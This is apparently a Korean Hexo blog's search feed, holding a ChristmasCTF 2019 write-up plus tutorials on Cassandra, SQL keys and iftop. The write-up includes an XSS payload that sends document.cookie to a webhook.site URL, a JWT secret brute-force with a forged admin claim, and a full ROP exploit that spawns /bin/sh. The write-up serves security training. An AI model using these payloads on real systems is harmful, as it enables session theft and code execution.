<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ChristmasCTF 2019 Write up</title>
      <link href="2020/12/26/christmasctf-201226/"/>
      <url>2020/12/26/christmasctf-201226/</url>
      
        <content type="html"><![CDATA[<h3 id="1-Web-watermelon"><a href="#1-Web-watermelon" class="headerlink" title="1. [Web] watermelon"></a>1. [Web] watermelon</h3><p>이 문제는 언인텐 풀이로 푼 것 같다. 문제 내에서 로그인 계정 중</p><p>admin 계정에 대해서</p><p>비밀번호가 admin 과 같이 세팅되어 있음을 알 수 있었고,</p><p>이를 통해 로그인 하여 플래그를 얻어낼 수 있었다.</p><h3 id="2-Web-JWT"><a href="#2-Web-JWT" class="headerlink" title="2. [Web] JWT"></a>2. [Web] JWT</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jwt: &#123;</span><br><span class="line">    bruth: &#123;</span><br><span class="line">      key: <span class="string">&#x27;********&#x27;</span>, <span class="comment">// 0~9, 8 length</span></span><br><span class="line">      options: &#123;</span><br><span class="line">        issuer: <span class="string">&#x27;c2w2m2&#x27;</span>,</span><br><span class="line">        expiresIn: <span class="string">&#x27;1d&#x27;</span>,</span><br><span class="line">        algorithm: <span class="string">&#x27;HS256&#x27;</span>,</span><br><span class="line">      &#125;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>해당 문제는 PHP JWT TOKEN 를 사용하는 문제이다.</p><p>config.js 에서 위와 같은 내용을 확인할 수 있었고</p><p>결론적으로 secret key를 브포해서 찾아내야 하는 것이였다.</p><p>그래서 해당 범위 내 숫자로 구성해서 브포를 돌려서 토큰의 secret key를 얻었고,</p><p>payload 부분에 있는 is_admin 항목을 true로 변조한 뒤 다시 인코딩하여 쿠키를 바꿔줌으로써 플래그를 얻었다.</p><ul><li>참고 : john the ripeer(<a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a>)</li></ul><h3 id="3-Web-CSRF"><a href="#3-Web-CSRF" class="headerlink" title="3. [Web] CSRF"></a>3. [Web] CSRF</h3><p>해당 문제는 CSRF(Cross-site-Request-Forgery) 취약점을 사용한 문제이다.</p><p>문제에 보면 게시글을 쓸 수 있는 공간이 있고, 해당 로직을 처리하는 부분의 코드를 분석했을 때 다음과 같은 사실을 알 수 있다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (board.content.match(<span class="regexp">/script|img|on/i</span>)) <span class="keyword">return</span> res.send(&#123; <span class="attr">code</span>: <span class="number">400</span> &#125;);</span><br></pre></td></tr></table></figure><p>무려 내용 작성에 대해서만 필터링을 걸고 제목에는 없다.. 그래서 이를 이용해서 제목에 페이로드를 넣었다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">&#x27;https://webhook.site~&#x27;</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><h3 id="4-Pwn-Solo-test"><a href="#4-Pwn-Solo-test" class="headerlink" title="4. [Pwn] Solo test"></a>4. [Pwn] Solo test</h3><p>ROP 기법을 이용해서 풀면 된다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./solo_test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./solo_test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc227.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pr = <span class="number">0x0000000000400b83</span></span><br><span class="line">ret = <span class="number">0x00000000004005f1</span></span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">solo = e.symbols[<span class="string">&#x27;solo&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offset = <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;Me&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;No&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;CTF&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;Never&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;No&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">88</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(solo)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;--&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">88</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;--&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Pwnable </tag>
            
            <tag> ChristmasCTF2019 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BISC CTF 2020(oldschool) write up</title>
      <link href="2020/11/21/bob-bisc-201129/"/>
      <url>2020/11/21/bob-bisc-201129/</url>
      
        <content type="html"><![CDATA[<p>사실 풀고나니 꽤나 쉬웠던 것 같은 문제인데, 요즘 시스템쪽을 하는둥 마는둥 하다보니 익스코드 짜는데</p><p>오래 걸려버려서 대회 중에는 인증을 못해봤었다.. (틈틈히 챙겨야 할듯)</p><p><a href="https://www.notion.so/jhyeon/BISC-2020-oldschool-write-up-7b4dc57cf9834eab9f1260adf1b609f5">https://www.notion.so/jhyeon/BISC-2020-oldschool-write-up-7b4dc57cf9834eab9f1260adf1b609f5</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BISC2020 </tag>
            
            <tag> Pwnable </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POX(Power of xx) 2020 Write up</title>
      <link href="2020/11/21/poxctf-201121/"/>
      <url>2020/11/21/poxctf-201121/</url>
      
        <content type="html"><![CDATA[<p>POX 2020 출제자 Write up 자료입니다.</p><p>아래 노션에서 풀이를 확인하실 수 있습니다.</p><p>질문 사항이 있으시면 <a href="mailto:&#115;&#116;&#106;&#104;&#121;&#101;&#111;&#x6e;&#x40;&#107;&#97;&#107;&#97;&#111;&#46;&#99;&#111;&#109;">&#115;&#116;&#106;&#104;&#121;&#101;&#111;&#x6e;&#x40;&#107;&#97;&#107;&#97;&#111;&#46;&#99;&#111;&#109;</a> 으로 메일을 보내주세요!</p><p><a href="https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417">https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> POX2020 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NoSQL - Cassandra Engine</title>
      <link href="2020/09/25/cassandra-200925/"/>
      <url>2020/09/25/cassandra-200925/</url>
      
        <content type="html"><![CDATA[<h2 id="Cassandra"><a href="#Cassandra" class="headerlink" title="Cassandra"></a>Cassandra</h2><h3 id="Cassandra란"><a href="#Cassandra란" class="headerlink" title="Cassandra란?"></a>Cassandra란?</h3><p>Cassandra(Free-Open Source Distributed NoSQL Database) 는 분산형 오픈소스 NoSQL Database이며,</p><p>단일 장애점(Single Point of Failure, SPOF) 없이 고성능을 제공하며 많은 서버들간에 대용량 데이터를 관리하기 위해 설계되었습니다.</p><p>Cassandra는 여러 데이터 센터(Data Center)에 걸쳐 Cluster를 지원하고 있으며 대용량의 데이터, 구조화, 비정형 데이터를 관리하는데 적합합니다.</p><h3 id="Cassandra의-장점-및-단점"><a href="#Cassandra의-장점-및-단점" class="headerlink" title="Cassandra의 장점 및 단점"></a>Cassandra의 장점 및 단점</h3><p>장점 : Consistent Hashing 구조를 이용한 Ring구조와 Gossip Protocol을 구현하였기 때문에,</p><p>각 노드의 장비추가, 제거 등이 자유롭고 데이터 센터까지 고려할 수 있는 데이터 복제 정책을 사용하고 있어 안정성 측면에서 많은 장점을 가지고 있습니다.</p><p>Cassandra를 이용하면 Sharing, Master-Slave와 같은 정책 없이도 장애 대응이 가능하며 장비를 늘리고 줄이는 것에 큰 비용이 들지 않습니다.</p><p>단점 : Cassandra는 테이블 간 Join이나 Transaction을 지원하지 않고, Index 등의 검색을 위한 기능도 매우 단출하며,</p><p>Cassandra의 구조상 RDBMS와 같은 페이징(Paging)을 구현하는 것이 어렵고 Keyspace, Table을 과도하게 생성할 경우 메모리 오버플로우가 발생할 수 있습니다.</p><h3 id="Cassandra-Data-Structure"><a href="#Cassandra-Data-Structure" class="headerlink" title="Cassandra Data Structure"></a>Cassandra Data Structure</h3><img src="/img/post/cassandra/1.png" class="lazyload placeholder" data-srcset="/img/post/cassandra/1.png" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"><p>Cassandra의 데이터 구조는 다음 사진과 같습니다.</p><p>Keyspace -&gt; Table -&gt; Row key -&gt; Column(Name, Value)로 구성되어 있습니다.</p><p>이 때 Keyspace와 Table에 대한 정보는 모든 Cassandra Node의 Memory에 저장되며 실제 데이터가 저장되는 Row는 각 Row-key를 가지고,</p><p>Hash(token)을 기준으로 각 노드에 분산 저장되어있습니다. 그리고 Row에 속하는 Column은 Column Name을 기준으로 정렬되어 저장됩니다.</p><h3 id="Cassandra-Column-Super-Column"><a href="#Cassandra-Column-Super-Column" class="headerlink" title="Cassandra Column, Super Column"></a>Cassandra Column, Super Column</h3><p>Cassandra의 컬럼과 슈퍼컬럼 두 컬럼 모두 Name, Value로 이루어진 튜플형입니다.</p><p>이 두 컬럼의 차이점은 문자열(String)과 Map 형태의 차이점입니다.</p><p>즉, 슈퍼컬럼의 값에는 다양한 형태의 데이터 타입을 가질 수 있습니다.</p><h3 id="Cassandra-설치"><a href="#Cassandra-설치" class="headerlink" title="Cassandra 설치"></a>Cassandra 설치</h3><ul><li><a href="https://cassandra.apache.org/download/">https://cassandra.apache.org/download/</a></li></ul><h3 id="Cassandra-예제"><a href="#Cassandra-예제" class="headerlink" title="Cassandra 예제"></a>Cassandra 예제</h3><p>Cassandra CQL Shell에 접속하는 방법은 다음과 같습니다. (Debian/Ubuntu 기준)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cqlsh</span><br></pre></td></tr></table></figure><p>이 때, 사용자 인증을 거치지않고 쉘에 접속하게 되는데 보안 설정을 위해서는 다음과 같이 설정합니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vi /etc/cassandra/cassandra.yaml</span><br></pre></td></tr></table></figure><p>(104 Lines) authenticator: PasswordAuthenticator # AllowAllAuthenticator 주석 처리 후 변경</p><p>이후 CQL Shell에 접속하기 위해서는 다음과 같은 명령어로 접속합니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cqlsh -u cassandra -p cassandra <span class="comment"># 기본 계정</span></span><br></pre></td></tr></table></figure><p>하지만 위와 같은 방법도 기본 계정으로 설정되어 있기 때문에 새로운 유저를 추가해서 사용하는 방식으로 변경합니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cassandra@cqlsh&gt; create user username with password <span class="string">&#x27;password&#x27;</span> superuser;</span><br><span class="line">cassandra@cqlsh&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cqlsh -u username -p password</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cassandra@cqlsh&gt; drop user cassandra;</span><br><span class="line">cassandra@cqlsh&gt; LIST USERS; /* 생성된 계정 확인 */</span><br></pre></td></tr></table></figure><p>이제 Cassandra에 대한 기본적인 보안을 거쳐 사용하실 수 있습니다!</p><h3 id="새로운-Keyspace-생성"><a href="#새로운-Keyspace-생성" class="headerlink" title="새로운 Keyspace 생성"></a>새로운 Keyspace 생성</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username@cqlsh&gt; create keyspace keyspace_name with replication = &#123;&#x27;class&#x27;: &#x27;SimpleStrategy&#x27;, &#x27;replication_factor&#x27;: 3&#125;;</span><br><span class="line">username<span class="variable">@cqlsh</span><span class="operator">&gt;</span> <span class="keyword">desc</span> keyspaces; <span class="comment">/* 생성된 keyspace 확인 */</span></span><br></pre></td></tr></table></figure><p>Replication이란 Keyspace를 생성할때 Replication의 복제 개수, 위치를 결정할 수 있는데 옵션은 아래와 같습니다.</p><p>SimpleStrategy 옵션은 단일 데이터 센터일 경우 사용하는 옵션이며,</p><p>멀티 데이터 센터를 사용할 경우 NetworkTopologyStrategy 를 사용하면 됩니다.</p><p>또, replication_factor란 동일한 데이터의 사본(복사본)을 수신할 클러스터의 시스템 수를 의미합니다.</p><h3 id="새로운-Table-생성"><a href="#새로운-Table-생성" class="headerlink" title="새로운 Table 생성"></a>새로운 Table 생성</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username<span class="variable">@cqlsh</span><span class="operator">&gt;</span> use keyspace_name; <span class="comment">/* 이전에 만든 keyspace로 접속 */</span></span><br><span class="line">username<span class="variable">@cqlsh</span>:keyspace_name<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> test.test_table(idx <span class="type">int</span>, name text, context text); <span class="comment">/* 테이블 생성 */</span></span><br><span class="line">username<span class="variable">@cqlsh</span>:keyspace_name<span class="operator">&gt;</span> <span class="keyword">desc</span> test.test_table;</span><br></pre></td></tr></table></figure><h3 id="생성한-Table에-데이터-삽입"><a href="#생성한-Table에-데이터-삽입" class="headerlink" title="생성한 Table에 데이터 삽입"></a>생성한 Table에 데이터 삽입</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="variable">@cqlsh</span>:keyspace_name<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> test.test_table (idx, name, context) <span class="keyword">values</span> (<span class="number">1</span>, <span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;bobgood&#x27;</span>); <span class="comment">/* 데이터 삽입 */</span></span><br><span class="line">username<span class="variable">@cqlsh</span>:keyspace_name<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test.test_table; <span class="comment">/* 테이블의 모든 행 조회 */</span></span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://meetup.toast.com/search?searchText=Cassandra">https://meetup.toast.com/search?searchText=Cassandra</a></p></li><li><p><a href="http://www.incodom.kr/Cassandra_%EC%A0%95%EC%9D%98">http://www.incodom.kr/Cassandra_%EC%A0%95%EC%9D%98</a></p></li><li><p><a href="https://newly0513.tistory.com/37">https://newly0513.tistory.com/37</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NoSQL </tag>
            
            <tag> Cassandra </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DB Primary Key, Foreign Key</title>
      <link href="2020/09/24/db-key-200924/"/>
      <url>2020/09/24/db-key-200924/</url>
      
        <content type="html"><![CDATA[<h3 id="SQL-제약조건"><a href="#SQL-제약조건" class="headerlink" title="SQL 제약조건"></a>SQL 제약조건</h3><ol><li>Not Null</li></ol><ul><li>데이터에 Null 값이 들어갈 수 없다.</li></ul><ol start="2"><li>Unique</li></ol><ul><li>데이터에 중복되는 값이 들어갈 수 없다.</li></ul><ol start="3"><li>Primary Key(PK)</li></ol><ul><li>각 행 또는 레코드를 고유하게 식별하는 값 (1+2 제약조건 포함)</li></ul><ol start="4"><li>Foreign Key(FK)</li></ol><ul><li>다른 테이블의 레코드를 참조하여 무결성을 검사한다.</li></ul><ol start="5"><li>Check</li></ol><ul><li>데이터의 범위 또는 사용자 조건을 지정한다.</li></ul><h3 id="PK-Primary-Key-란"><a href="#PK-Primary-Key-란" class="headerlink" title="PK(Primary Key)란?"></a>PK(Primary Key)란?</h3><p>데이터베이스 테이블에서 각 행 또는 레코드를 고유하게 식별하는 테이블의 필드를 의미합니다.</p><p>기본 키(PK)는 반드시 고유한 값을 가지며, 기본 키로 설정된 열은 NULL(빈 값)을 가질 수 없습니다.</p><p>또, 하나의 테이블에는 반드시 하나의 기본 키(PK)만을 구성할 수 있습니다.</p><p>(추가) 중복 항목이 입력되지 않기 위해서 PK를 사용하는데 제약조건으로는 여러 개를 추가할 수 없지만,</p><p>테이블을 만들 때 다중 PK를 지정하게 되면 생성이 가능하고 지정한 모든 PK 컬럼에는 중복 데이터가 들어갈 수 없습니다.</p><h3 id="PK-Primary-Key-생성-예제"><a href="#PK-Primary-Key-생성-예제" class="headerlink" title="PK(Primary Key) 생성 예제"></a>PK(Primary Key) 생성 예제</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(</span><br><span class="line">    userid <span class="type">varchar</span>(<span class="number">25</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    username <span class="type">varchar</span>(<span class="number">5</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">primary</span> <span class="keyword">key</span>(userid)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(</span><br><span class="line">    userid <span class="type">varchar</span>(<span class="number">25</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    username <span class="type">varchar</span>(<span class="number">5</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">primary</span> <span class="keyword">key</span>(userid, username)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>다음과 같이 test 테이블을 생성하고 userid의 속성을 기본 키(PK)로 지정하기 위한 예제입니다.</p><p>이 때, PK로 지정하고자 하는 컬럼은 반드시 “not null”의 제약조건을 가지고 있어야합니다.</p><p>(추가) 2번째 예시는 다중 복합키로 테이블을 구성할 떄의 예시입니다.</p><h3 id="FK-Foreign-Key-란"><a href="#FK-Foreign-Key-란" class="headerlink" title="FK(Foreign Key)란?"></a>FK(Foreign Key)란?</h3><p>테이블의 특정 행 또는 레코드를 서로 연결시켜주는 것을 외래키(Foreign Key)라고 부르고,</p><p>RDBMS(Relation Database Management System)에서 명시적으로 테이블을 연결해주는 장치를 의미합니다.</p><p>예를 들어서 사용자로부터 주문을 받고 처리하기까지의 과정이 있다고 가정하면,</p><p>고객 정보를 저장하는 테이블, 주문을 처리하는 테이블 두개로 나누어서 보자.</p><p>그럼 고객이 특정 상품에 대해서 주문을 했을 때 주문을 처리하는 테이블로 고객의 정보와 함께 어떤 상품인지에 대한 정보가 기록될 것 이고,</p><p>여기서 주문을 한 사용자 정보를 고객 테이블에서 외래키로 참조하여 가져온다면 주문 테이블에 있는 고객들은,</p><p>실제 고객 정보 테이블에 존재하는 사용자라고 볼 수 있으며 무결성이 검증된다는 의미이다.</p><h3 id="FK-Foreign-Key-생성-예제"><a href="#FK-Foreign-Key-생성-예제" class="headerlink" title="FK(Foreign Key) 생성 예제"></a>FK(Foreign Key) 생성 예제</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Customer_TB(</span><br><span class="line">id <span class="type">varchar</span>(<span class="number">25</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">5</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">age <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">phone <span class="type">varchar</span>(<span class="number">15</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">address <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"><span class="keyword">primary</span> <span class="keyword">key</span>(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Order_TB(</span><br><span class="line">order_num <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="keyword">null</span> auto_increment,</span><br><span class="line">customer_id <span class="type">varchar</span>(<span class="number">25</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">order_date datetime <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">order_amount <span class="type">int</span>(<span class="number">4</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"><span class="keyword">primary</span> <span class="keyword">key</span>(order_num),</span><br><span class="line"><span class="keyword">foreign</span> <span class="keyword">key</span>(customer_id) <span class="keyword">references</span> Customer_TB(id) <span class="keyword">ON</span> <span class="keyword">UPDATE</span> CASCADE <span class="keyword">ON</span> <span class="keyword">DELETE</span> CASCADE</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>두 예졔를 보면 위에서 간단한 예시로 설명을 했듯이 똑같이 SQL 구문으로 작성한 것이다.</p><p>여기서 ON UPDATE, ON DELETE 라는 옵션이 있는데 해당 옵션은 외래키(Foreign Key)의 제약조건에 의해</p><p>참조되는 테이블에서 수정, 삭제가 일어날 때 참조하고 있는 테이블도 시스템에서 자동으로 데이터에 대한 수정, 삭제를 수행함을 의미합니다.</p><ol><li><p>CASCADE : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블에서도 삭제와 수정이 같이 이루어집니다.</p></li><li><p>SET NULL : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블의 데이터는 NULL로 변경됩니다.</p></li><li><p>NO ACTION : 참조되는 테이블에서 데이터를 삭제하거나 수정해도, 참조하는 테이블의 데이터는 변경되지 않습니다.</p></li><li><p>SET DEFAULT : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블의 데이터는 필드의 기본값으로 설정됩니다.</p></li><li><p>RESTRICT : 참조하는 테이블에 데이터가 남아 있으면, 참조되는 테이블의 데이터를 삭제하거나 수정할 수 없습니다.</p></li></ol><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="http://www.tcpschool.com/mysql/mysql_constraint_foreignKey">http://www.tcpschool.com/mysql/mysql_constraint_foreignKey</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DB </tag>
            
            <tag> Primary Key </tag>
            
            <tag> Foreign Key </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux[iftop] Example</title>
      <link href="2020/09/17/linux-iftop-200917/"/>
      <url>2020/09/17/linux-iftop-200917/</url>
      
        <content type="html"><![CDATA[<h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libpcap-dev</span><br><span class="line">$ sudo apt-get install iftop</span><br></pre></td></tr></table></figure><h3 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo iftop <span class="comment"># 라이브로 모니터링 하기 때문에 root 권한이 필요하다.</span></span><br></pre></td></tr></table></figure><p>별도의 옵션 없이 실행했을때는 네트워크의 최상단 인터페이스를 기준으로 실시간 모니터링을 수행한다.</p><p>첫번째 라인은 서버의 호스트, 두번째 라인은 대상 호스트 네임(IP 주소), 세번째 라인은 패킷의 전송량을 표시해준다.</p><p>또한 하단의 TX, RX, TOTAL 정보들은 각각 전송량, 수신량, 총 송/수신량을 의미한다.</p><p>그리고 -f(filter) 옵션을 통해 특정 조건에 해당하는 네트워크 패킷만을 보여주는 옵션이 있다.</p><p>pcap-filter 형식의 문자열로 보면되고, 필터 옵션들은 다음과 같다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ man pcap-filter</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo iftop -f <span class="string">&quot;src host 127.0.0.1&quot;</span></span><br><span class="line">$ sudo iftop -f <span class="string">&quot;dst host 8.8.8.8&quot;</span></span><br></pre></td></tr></table></figure><p>주로 사용될만한 것들을 정리하면 다음과 같다.</p><p>자세한 것은 manpage에 보면 상세히 나와있다!</p><h3 id="pcap-filter"><a href="#pcap-filter" class="headerlink" title="pcap-filter"></a>pcap-filter</h3><p>dst host hostname    목적지 호스트네임(IP주소)<br>src host hostname    출발지 호스트네임(IP주소)<br>dst port port    목적지 포트<br>src port port    출발지 포트<br>ip 